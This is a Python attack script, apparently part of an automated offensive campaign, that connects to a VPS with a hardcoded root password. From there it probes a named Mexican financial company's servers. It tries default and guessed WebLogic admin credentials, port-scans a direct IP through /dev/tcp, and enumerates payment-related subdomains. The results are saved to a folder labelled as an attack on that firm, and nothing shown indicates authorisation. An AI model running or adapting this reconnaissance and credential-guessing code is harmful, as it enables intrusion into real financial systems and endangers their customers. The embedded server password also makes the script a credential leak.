#!/usr/bin/env python3
"""HEXAGON GLM 5.2 - WebLogic probe + final consolidation"""
import paramiko, json, time, re, sys, io, base64
from datetime import datetime, timezone
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

VPS_HOST = "64.177.88.10"; VPS_USER = "root"; VPS_PASS = "5F.jyTK$D6%.F{a="

def ssh_exec(client, cmd, timeout=60):
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    return stdout.read().decode("utf-8", errors="replace"), stderr.read().decode("utf-8", errors="replace")

def safe_print(s, maxlen=2500):
    s = str(s)
    if len(s) > maxlen: s = s[:maxlen] + "...[truncated]"
    try: print(s)
    except: print(repr(s)[:maxlen])

def main():
    print(f"[*] Connecting to VPS...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(VPS_HOST, username=VPS_USER, password=VPS_PASS, timeout=30)
    print("[+] Connected")

    log = {}

    # 1. WebLogic probe - multiple ports and methods
    print("\n[*] === WebLogic probe ===")
    wl_targets = [
        # core.findep.mx various ports
        ("http://core.findep.mx:7001/", "HTTP 7001"),
        ("http://core.findep.mx:7002/", "HTTP 7002"),
        ("http://core.findep.mx:8001/", "HTTP 8001"),
        ("http://core.findep.mx:80/", "HTTP 80"),
        ("http://core.findep.mx:443/", "HTTP 443"),
        ("https://core.findep.mx/", "HTTPS 443"),
        ("https://core.findep.mx:7001/", "HTTPS 7001"),
        # Try common WebLogic paths
        ("http://core.findep.mx:7001/console", "WL console 7001"),
        ("http://core.findep.mx:7001/console/login/LoginForm.jsp", "WL login form"),
        ("https://core.findep.mx/console", "WL console 443"),
        # Direct IP
        ("http://35.188.27.26:7001/", "IP direct 7001"),
        ("http://35.188.27.26:80/", "IP direct 80"),
        ("https://35.188.27.26/", "IP direct 443"),
    ]
    wl_results = {}
    for url, label in wl_targets:
        cmd = (f"curl -sk -m 10 -A 'Mozilla/5.0' -o /tmp/wl.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}} TYPE:%{{content_type}} REDIR:%{{redirect_url}}' '{url}' 2>&1")
        out, _ = ssh_exec(client, cmd, timeout=15)
        body, _ = ssh_exec(client, "head -c 1500 /tmp/wl.html", timeout=10)
        wl_results[label] = {"url": url, "response": out.strip(), "body": body[:1000]}
        print(f"  [{label}] {url}: {out.strip()}")
        if "HTTP:200" in out or "HTTP:302" in out or "HTTP:401" in out:
            safe_print(f"    body: {body[:500]}")
    log["weblogic_probe"] = wl_results

    # 2. Try WebLogic default creds via HTTP Basic Auth
    print("\n[*] === WebLogic default creds ===")
    wl_auth_urls = [
        "http://core.findep.mx:7001/console/login/LoginForm.jsp",
        "http://core.findep.mx:7001/management",
        "https://core.findep.mx/console/login/LoginForm.jsp",
    ]
    wl_creds = [
        ("weblogic", "Findep2021"),
        ("weblogic", "welcome1"),
        ("weblogic", "weblogic"),
        ("weblogic", "weblogic1"),
        ("admin", "Findep2021"),
    ]
    wl_auth_results = []
    for url in wl_auth_urls:
        for user, pwd in wl_creds:
            auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            cmd = (f"curl -sk -m 10 -A 'Mozilla/5.0' -u '{user}:{pwd}' "
                   f"-o /tmp/wl_auth.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' '{url}'")
            out, _ = ssh_exec(client, cmd, timeout=15)
            body, _ = ssh_exec(client, "head -c 500 /tmp/wl_auth.html", timeout=10)
            print(f"  {user}:{pwd} @ {url[-50:]}: {out.strip()}")
            wl_auth_results.append({"url": url, "user": user, "password": pwd,
                                     "response": out.strip(), "body": body[:500]})
            time.sleep(0.5)
    log["weblogic_auth"] = wl_auth_results

    # 3. Port scan core.findep.mx
    print("\n[*] === Port scan core.findep.mx ===")
    ports_to_try = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 1433, 1521, 3306,
                    3389, 5432, 5900, 7000, 7001, 7002, 7003, 8000, 8001, 8080, 8443,
                    8888, 9000, 9090, 9091, 9200, 9300, 27017]
    open_ports = []
    for port in ports_to_try:
        cmd = f"timeout 3 bash -c 'echo > /dev/tcp/35.188.27.26/{port}' 2>&1 && echo 'OPEN' || echo 'CLOSED'"
        out, _ = ssh_exec(client, cmd, timeout=8)
        if "OPEN" in out:
            open_ports.append(port)
            print(f"  Port {port}: OPEN")
    log["open_ports_core"] = open_ports
    print(f"\n  Open ports: {open_ports}")

    # 4. Probe other findep subdomains
    print("\n[*] === Other findep subdomains ===")
    sub_targets = [
        "https://www.findep.mx",
        "https://findep.mx",
        "https://www.independencia.com.mx",
        "https://independencia.com.mx",
        "https://core.findep.mx",
        "https://api.findep.mx",
        "https://app.findep.mx",
        "https://portal.findep.mx",
        "https://sso.findep.mx",
        "https://auth.findep.mx",
        "https://login.findep.mx",
        "https://admin.findep.mx",
        "https://spei.findep.mx",
        "https://pagos.findep.mx",
        "https://pago.findep.mx",
        "https://transferencias.findep.mx",
    ]
    sub_results = {}
    for host in sub_targets:
        cmd = (f"curl -sk -m 10 -A 'Mozilla/5.0' -o /dev/null "
               f"-w 'HTTP:%{{http_code}} SIZE:%{{size_download}} REDIR:%{{redirect_url}} SERVER:%{{content_type}}' '{host}' 2>&1")
        out, _ = ssh_exec(client, cmd, timeout=15)
        sub_results[host] = out.strip()
        if "HTTP:000" not in out:
            print(f"  {host}: {out.strip()}")
    log["subdomain_probe"] = sub_results

    log["timestamp"] = datetime.now(timezone.utc).isoformat()
    out_file = r"c:\xampp\htdocs\pentagi\independencia_attack\hexagon_glm_weblogic.json"
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(log, f, indent=2, ensure_ascii=False)
    print(f"\n[+] WebLogic results saved to {out_file}")

    client.close()

if __name__ == "__main__":
    main()
